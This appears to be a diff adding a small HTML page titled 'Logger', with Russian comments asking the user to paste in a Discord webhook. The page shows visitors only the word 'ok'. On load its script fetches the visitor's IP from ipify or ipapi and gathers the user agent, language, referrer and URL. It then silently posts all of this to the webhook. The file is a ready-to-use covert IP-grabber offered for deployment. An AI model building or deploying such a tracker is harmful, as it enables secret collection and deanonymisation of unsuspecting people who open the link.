@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Logger</title>
+  <style>
+    body { margin:0; height:100vh; display:grid; place-items:center; background:#0a0a0f; color:#555; font-family:system-ui,sans-serif; font-size:.8rem; }
+  </style>
+</head>
+<body>
+  <div id="status">ok</div>
+  <script>
+    // ══════════════════════════════════════════════
+    // ВСТАВЬ СЮДА СВОЙ DISCORD WEBHOOK
+    const WEBHOOK = "https://discord.com/api/webhooks/ВАШ_ID/ВАШ_ТОКЕН";
+    // ══════════════════════════════════════════════
+
+    async function getIP() {
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const d = await r.json();
+        return d.ip || "unknown";
+      } catch {
+        try {
+          const r2 = await fetch("https://ipapi.co/json/");
+          const d2 = await r2.json();
+          return d2.ip || "unknown";
+        } catch { return "blocked"; }
+      }
+    }
+
+    async function logVisit() {
+      const ip = await getIP();
+      const payload = {
+        embeds: [{
+          title: "Новый визит",
+          color: 0x66d9ff,
+          fields: [
+            { name: "IP", value: `\`${ip}\``, inline: true },
+            { name: "Время", value: new Date().toLocaleString("ru-RU"), inline: true },
+            { name: "User-Agent", value: (navigator.userAgent || "—").slice(0, 200) },
+            { name: "Язык", value: navigator.language || "—", inline: true },
+            { name: "Откуда", value: document.referrer || "прямой заход", inline: true },
+            { name: "Страница", value: location.href }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+      try {
+        await fetch(WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch(e) {}
+    }
+    logVisit();
+  </script>
+</body>
+</html>
